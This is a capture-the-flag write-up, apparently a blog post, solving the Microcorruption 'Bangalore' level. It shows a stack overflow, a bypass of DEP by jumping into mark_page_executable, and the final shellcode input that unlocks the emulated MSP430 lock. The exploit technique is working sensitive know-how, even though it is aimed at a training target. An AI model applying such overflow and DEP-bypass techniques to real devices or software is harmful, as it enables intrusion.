---
title: "Microcorruption CTF: Bangalore"
categories: CTF
comments: true
---

This is my writeup for the "Bangalore" level on the [Microcorruption](https://microcorruption.com) CTF. If you haven't already solved it or given it your best shot, you should probably stop reading and go do that first.

This level introduces the concept of DEP, or Data Execution Prevention. You can read a lot about DEP elsewhere, but the gist of it is in the name -- it prevents instructions from being executed in certain areas of memory. So simply injecting and running your favorite shellcode will no longer work, if that area of memory is marked as non-executable. We will have to find a way around DEP. Let's check the Lock Manual for the specifics.

Under the interrupts, we can see that `INT 0x10` without any arguments turns on DEP. There doesn't appear to be a way to turn it off. `INT 0x11` marks a page as either only executable, or only writeable. It takes two arguments, the first argument being the page number, the second being 1 if writeable, 0 if executable. Okay, that sounds pretty straightforward.

The executable is short and easy to decipher compared to previous levels. To begin, the function `set_up_protection` is called, which marks pages as writeable or executable, and then turns on DEP.

```nasm
44e0:  clr      r15
44e2:  call     #0x44b4 <mark_page_executable>
```

The very first page (0x0) is marked executable. This makes sense, since address 0x10 has a callgate causing the software interrupt that must be executable.

```nasm
44e6:  mov      #0x1, r11
44e8:  mov      r11, r15
44ea:  call     #0x449c <mark_page_writable>
44ee:  inc      r11
44f0:  cmp      #0x44, r11
44f4:  jne      #0x44e8 <set_up_protection+0xa>
```

This next section marks the next 0x43 pages as writeable. Since the base of the executable is at address 0x4400, we can probably safely assume the page size is 256 bytes for the MSP430. Thus the stack and heap are writeable. The remaining pages are all marked as executable.

Strangely, looking at `main`, `login` and `conditional_unlock_door`, the password doesn't appear to be read or validated anywhere. Nowhere is INT 0x7E called. So this lock doesn't appear open at all. All passwords will be rejected, so the only way to open it is through shellcode.

```nasm
4526:  mov      #0x30, r14
452a:  mov      sp, r15
452c:  call     #0x4462 <getsn>
4530:  mov      #0x2465, r15
4534:  call     #0x447a <puts>
4538:  add      #0x10, sp
453c:  ret
```

Breaking on this section shows us that we've got a buffer overflow of size 0x20 (0x30 - 0x10) on the stack, the first word of which is the return address, at 0x3ffe.

Let's try executing some shellcode. We enter the following password:

```
4141 4141 4141 4141 4141 4141 4141 4141 | ee3f
```

This overwrites the `login` return address to 0x3fee, which is the start of our buffer. After entering it, and trying to execute 0x4141, you'll get the following message:

```
Segmentation Fault: can not execute write-only page.
```

That is DEP at work. The pages containing our buffer are marked as non-executable. So when we jump the program counter into our shellcode, the program segfaults. We have to mark our buffer as executable first. How do we do that? First we look at `mark_page_executable`. It takes its arguments from registers r14 and r15.

```nasm
44b6:  push      #0x0
44b8:  push      r14
44ba:  sub       #0x6, sp
44be:  mov       #0x9100, sr
44c2:  call      #0x10
44c6:  add       #0xa, sp
```

It pushes 0x0 and the page number in r14 to the stack, and then calls the interrupt, with 0x9100 in the status register, sr (you'll remember 0x11 was the interrupt to mark a page writeable or executable. It's been operated with an & 0x8000. It appears that the most significant bit is some kind of flag). Since we control the stack, we can simply place 0x0 and our page number of choice on the stack, and skip to 0x44ba (we could also skip to 0x44bc, but it would change the alignment for the two interrupt arguments on the stack by 0x6).

So which page do we set to executable? Our buffer spans page 0x3f and 0x40. The shellcode to open the lock is quite small. So in the interest of keeping the entered password short, let's mark page 0x3f as executable.

Let's construct our input to bypass DEP:

```
4141 4141 4141 4141 4141 4141 4141 4141 | ba44 | 3f00 0000 | ee3f
```

The 16 dummy bytes are the password buffer. The next word is the `login` return address. We overwrite this in with 0x44ba in order to jump to the middle of `mark_page_executable`. The next two words are the arguments to the interrupt -- 0x003f is the page number, 0x0000 designates it as executable. The next word is the `mark_page_executable` return address. We overwrite it with 0x3fee in order to return to our buffer.

If you try this, you'll note there is no segfault, the next (garbage) instruction 0x4141 is executed. Success! That means the first part of our buffer is now executable. You may have noticed that the sixth word of our buffer was overwritten with 0x44c6. This was the return address for the interrupt. So that limits our shellcode to 5 words. If we need more, we can simply jump to after the return address, and place our shellcode there (making sure to mark page 0x40 executable instead of 0x3f).

Now that everything is in place, we need to write the shellcode to open the lock. This is done by triggering `INT 0x7F`. So let's write the instructions to do that.

```nasm
mov       #0xff00, sr
call      #0x10
```

0xff00 is the result of 0x8000 & 0x7f00. The rest is straightforward. The instructions can be translated into machine code by using the assembler on the site, referencing the MSP430 instruction set, or simply looking for similar instructions in the executable.

Putting it all together, we get the following input that opens the lock.

```
3240 00ff b012 1000 4141 4141 4141 4141 ba44 3f00 0000 ee3f
```
